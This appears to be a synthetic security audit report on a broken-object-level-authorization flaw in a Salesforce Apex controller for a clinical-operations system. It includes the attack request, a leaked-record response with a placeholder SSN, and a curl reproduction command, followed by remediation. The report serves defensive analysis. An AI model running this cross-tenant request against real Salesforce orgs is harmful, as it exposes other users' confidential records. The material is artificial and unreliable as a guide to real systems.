# Security Analysis Report
**System:** TrialVault ClinicalOps API (Salesforce-Integrated)
**Domain:** Pharmaceutical / Clinical Operations
**Example ID:** SF-0071
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant / cross-tenant access on `ContractController.approveContract` — attacker reads any pharmaceutical Contract record |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Contract Object (Pattern 1.5)

### Summary
The Apex controller `ContractController` on TrialVault ClinicalOps API (`b2679430.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contract object. Per §5.0 Pattern 1.5, multi-tenant isolation is broken — an attacker reads Contract `0019430` belonging to another user by substituting `contractId`. In pharma/clinical operations, Contract records may contain clinical trial agreements, regulatory submissions, and trial participant PII.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContractDetails(String contractId, ...)` while the Aura descriptor in §6.0 is `c.ContractController.approveContract`. These names conflict (read vs. approve). The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://b2679430.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b2679430.lightning.force.com/aura
Authorization: Bearer 00DB2679430!ARb2679430...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB2679430!ARb2679430...

message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
"params":{"contractId":"0019430","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0019430", "Name": "Victim Contract Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-13-8179"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DB2679430!ARb2679430..."
curl -s -X POST "https://b2679430.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"0019430","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-13-8179
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContractController { ... }`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. `approveContract` should perform approval logic only — field selection parameter should not enable read pivots.
